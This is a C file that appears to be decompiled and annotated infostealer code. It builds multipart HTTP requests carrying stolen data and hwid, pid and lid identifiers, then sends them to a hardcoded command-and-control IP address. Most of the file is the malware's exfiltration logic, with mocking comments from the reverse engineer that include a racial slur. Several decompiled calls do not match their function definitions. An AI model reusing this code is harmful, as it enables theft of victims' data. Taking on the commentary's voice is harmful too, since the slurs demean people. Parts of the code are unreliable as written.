#include "Header.h"

size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_t *_bffSize)
{   // nigga wtf this func is just doing the most basic thing—stuffing a multipart/form-data request with random junk, 
    // probably some HWID or other useless identifier like it some genius move.
    // It's basically taking a wide string, making it look like it does something cool, then throwing it in the header
    // Then it slaps random file data to the body like this is some fancy attack nah its just sending ur info to the C2
    
    int unused1;
    int bufferOffset;
    CHAR *ShitiStr;
    size_t bffSize;
    unsigned int currentPosition;
    size_t resultSize;
    bufferOffset = unused1;
    currentPosition = *_bffSize;

    ShitiStr = convertWideToAnsi(&globalData); // same fcking globalData btw
    bffSize = *_bffSize;
    *(_WORD *)(*_bffSize + bufferOffset) = 11565;
    memmove((void *)(bffSize + bufferOffset + 2), ShitiStr, strlen(ShitiStr));
    currentPosition = strlen(ShitiStr) + bffSize + 2;

    // build a multipart form request
    qmemcpy((void *)(currentPosition + bufferOffset), "\r\nContent-Disposition: form-data; name=\"file", 44);
    qmemcpy((void *)(currentPosition + bufferOffset + 44), "\"; filename=\"", 13);
    
    // identifier or special value : 1701603686
    *(_DWORD *)(currentPosition + bufferOffset + 57) = 1701603686;
    *(_WORD *)(currentPosition + bufferOffset + 61) = 3362;
    *(_BYTE *)(currentPosition + bufferOffset + 63) = 10;
    qmemcpy((void *)(currentPosition + bufferOffset + 64), "Content-Type: attachment/x-object\r\n\r\n", 0x25u);
    memmove((void *)(currentPosition + bufferOffset + 101), dataToSend, dataSize);
    *(_WORD *)(currentPosition + dataSize + bufferOffset + 101) = 2573;
    resultSize = currentPosition + dataSize + 103;
    *_bffSize = resultSize;

    return resultSize;
}

int __fastcall AddRequestParameter(int requestBufferOffset, const void *parameterName, void *parameterValue, int *_bffSize)
{   // here we go again another dumb attempt at appending data to some HTTP request
    // like its doing some genius encryption or compression but nah, its just spitting random strings and values into headers
    // It grabs the wch string (probably some ID or key) slaps it in the request, then chucks the rest of the random junk bam skibiddi skibiddi hawk twah hawk

    CHAR *wideStrProcessed; int currentOffset; unsigned int finalOffset; unsigned int tempSize;
    int result; unsigned int processedLength;

    wideStrProcessed = convertWideToAnsi(&WideCharStr);
    currentOffset = *_bffSize;
    *(_WORD *)(*_bffSize + requestBufferOffset) = 11565;
    memmove((void *)(requestBufferOffset + currentOffset + 2), wideStrProcessed, strlen(wideStrProcessed));
    processedLength = strlen(wideStrProcessed) + *_bffSize + 2;
    qmemcpy((void *)(processedLength + requestBufferOffset), "\r\nContent-Disposition: form-data; name=\"", 0x28u);
    memmove((void *)(processedLength + requestBufferOffset + 40), parameterName, strlen((const char *)parameterName));
    finalOffset = processedLength + 40 + strlen((const char *)parameterName);
    *(_DWORD *)(finalOffset + requestBufferOffset) = 218762530;
    *(_BYTE *)(finalOffset + requestBufferOffset + 4) = 10;
    memmove((void *)(finalOffset + requestBufferOffset + 5), parameterValue, strlen((const char *)parameterValue));
    tempSize = strlen((const char *)parameterValue);
    *(_WORD *)(finalOffset + tempSize + requestBufferOffset + 5) = 2573; 
    result = finalOffset + tempSize + 7;
    *_bffSize = result;
    return result;
}

int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
{
    uint32_t sessionID = (uint32_t)SysInfo[1];
    int32_t* dataPointer = *(uint32_t*)SysInfo;
    char* sessionStr = Alloc();
    __ltoa(sessionID, sessionStr, 10);
    void* buffer = nullptr;
    void* tempBuffer = nullptr;
    
    if (dataPointer)
    {
        CleanupData(dataPointer);
        ProcessData(dataPointer);
        buffer = *(uint32_t*)dataPointer;
        void* tempStorage = buffer;
        int32_t flag = 1;
        void* allocatedMemory = malloc(5u);
        tempBuffer = allocatedMemory;
        ProcessUserOrSystemData(allocatedMemory, *(uint32_t*)(dataPointer[18] + 72), buffer);
        HandleProcessing(dataPointer, 1);
        FinalizeData(dataPointer, 1);
        _free(dataPointer);
    }
    
    char* headerBuffer = Alloc(0x800);
    void* requestData = Alloc((char*)buffer + 0x1000);
    char const* const contentType = "Content-Type: multipart/form-data";
    PSTR formattedData = convertWideToAnsi(&globalData);
    // that globalData are awesome, is some next-level trash -_-, just a hardcoded mess with random junk like "aj195iak20ka99441aj1". This "genius" dev thinks this is clever, but nah—it’s probably some weak attempt at generating a HWID or a stolen key for auth, who knows? It's like they couldn't even come up with a real idea.  
    // They’re calling ProcessingTheWideStr() like it's doing some serious stuff, but it's just butchering the data to make it look like it's doing work—total waste of time.  
    // Now, they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?  
    // The dev’s probably thinking theyre soo slick, but theyre just out here grabbing basic stuff like HWID, PID, lid, and sending it to a server. This is barely even hacking. It's scraping system info, tossing it into a server request, and calling it "data exfiltration" How original.  
    // They even throw in an IP address "195.123.226.91" what a genius (lol). Grabbing an IP like it’s something special. Like no ones ever done that before.  
    // lol, i cant reverse lazy data-stealing tool, thats enough cobbled together by some skiddie dev who probably thinks theyre reinventing the wheel. just taking stuff that's already there and sending it out in the most basic, amateur way possible

    char currentChar;

    do
    {
        currentChar = *(uint8_t*)contentType;
        *(uint8_t*)(headerBuffer - "Content-Type: multipart/form-data" + contentType) = currentChar;
        contentType = &contentType[1];
    } while (currentChar);

    PSTR charPointer = formattedData;
    PSTR stringEnd;

    do
    {
        stringEnd = *(uint8_t*)charPointer;
        charPointer = &charPointer[1];
    } while (stringEnd);

    ProcessUserOrSystemData(&headerBuffer[44], formattedData, charPointer - &charPointer[1]);

    char nextChar;
    do
    {
        nextChar = *(uint8_t*)formattedData;
        formattedData = &formattedData[1];
    } while (nextChar);
    
    int32_t responseStatus = 0;
    *(uint8_t*)(formattedData - &formattedData[1] + headerBuffer + 44) = nextChar;
    
    char* requestID;
    int32_t processingCode;
    requestID = GenerateRequestID();
    PrcssingMultipartRequest(&responseStatus, processingCode, requestData, tempBuffer, buffer, &responseStatus);
    AddRequestParameter(&responseStatus, "hwid", requestData, requestID, &responseStatus);
    AddRequestParameter(&responseStatus, "pid", requestData, sessionStr, &responseStatus);
    AddRequestParameter(&responseStatus, "lid", requestData, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", &responseStatus);
    
    convertWideToAnsi(u"195.123.226.91");
    SendWebRequest(headerBuffer, requestData, responseStatus);
    
    return _free(tempBuffer);
}
